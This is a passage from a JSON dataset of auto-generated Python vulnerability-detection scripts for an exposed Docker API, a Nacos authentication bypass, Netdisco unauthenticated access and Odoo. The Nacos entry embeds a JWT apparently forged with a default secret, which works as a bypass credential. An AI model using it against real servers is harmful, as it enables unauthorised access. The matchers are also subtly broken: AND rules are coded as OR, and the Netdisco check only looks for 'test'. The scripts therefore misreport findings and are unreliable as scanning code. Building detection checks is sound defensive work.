        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: misconfigured-docker\nName: Docker Container - Misconfiguration Exposure\nSeverity: critical\nDescription: A Docker container misconfiguration was discovered. The Docker daemon can listen for Docker Engine API requests via three different types of Socket - unix, tcp, and fd. With tcp enabled, the default setup provides un-encrypted and un-authenticated direct access to the Docker daemon. It is conventional to use port 2375 for un-encrypted, and port 2376 for encrypted communication with the daemon.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_misconfigured_docker:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"misconfigured-docker\"\n    SEVERITY = \"critical\"\n    NAME = \"Docker Container - Misconfiguration Exposure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"ParentId\":, \"Containers\":, \"Labels\":\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"ParentId\":, \"Containers\":, \"Labels\":']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Docker Container - Misconfiguration Exposure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_misconfigured_docker(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "misconfig",
          "docker",
          "unauth",
          "devops",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_nacos_authentication_bypass",
        "name": "Nacos < 2.2.0 - Authentication Bypass",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "The authentication function of Nacos is can be bypass through default JWT secret.",
        "severity": "critical",
        "detection": "[AND] mot(s) '\"username\":, \"password\":' | mot(s) 'application/json' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          },
          {
            "name": "token",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: token",
            "default": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: nacos-authentication-bypass\nName: Nacos < 2.2.0 - Authentication Bypass\nSeverity: critical\nDescription: The authentication function of Nacos is can be bypass through default JWT secret.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_nacos_authentication_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"nacos-authentication-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"Nacos < 2.2.0 - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"username\":, \"password\":\\' | mot(s) \\'application/json\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"username\":, \"password\":', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Nacos < 2.2.0 - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_nacos_authentication_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: nacos-authentication-bypass\nName: Nacos < 2.2.0 - Authentication Bypass\nSeverity: critical\nDescription: The authentication function of Nacos is can be bypass through default JWT secret.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_nacos_authentication_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"nacos-authentication-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"Nacos < 2.2.0 - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"username\":, \"password\":\\' | mot(s) \\'application/json\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"username\":, \"password\":', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Nacos < 2.2.0 - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_nacos_authentication_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "auth-bypass",
          "nacos",
          "misconfig",
          "jwt",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_netdisco_unauth",
        "name": "Netdisco - Unauth Access",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "Detects an unauth dashboard access of Netdisco.",
        "severity": "critical",
        "detection": "[OR] DSL: contains_all(body, \"User Management\", \"/admin/discoverall\", \"Logged in as\"); status_code == 200",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: netdisco-unauth\nName: Netdisco - Unauth Access\nSeverity: critical\nDescription: Detects an unauth dashboard access of Netdisco.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_netdisco_unauth:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"netdisco-unauth\"\n    SEVERITY = \"critical\"\n    NAME = \"Netdisco - Unauth Access\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains_all(body, \"User Management\", \"/admin/discoverall\", \"Logged in as\"); status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Netdisco - Unauth Access\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_netdisco_unauth(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: netdisco-unauth\nName: Netdisco - Unauth Access\nSeverity: critical\nDescription: Detects an unauth dashboard access of Netdisco.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_netdisco_unauth:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"netdisco-unauth\"\n    SEVERITY = \"critical\"\n    NAME = \"Netdisco - Unauth Access\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains_all(body, \"User Management\", \"/admin/discoverall\", \"Logged in as\"); status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Netdisco - Unauth Access\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_netdisco_unauth(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "netdisco",
          "misconfig",
          "unauth",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_odoo_unprotected_database",
        "name": "Odoo - Unprotected Database",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "The system has an Odoo application whose database manager is unprotected, indicating potential unauthorized access.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Warning, your Odoo database manager is not protected.' | mot(s) 'The database manager has been disabled by the administrator' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
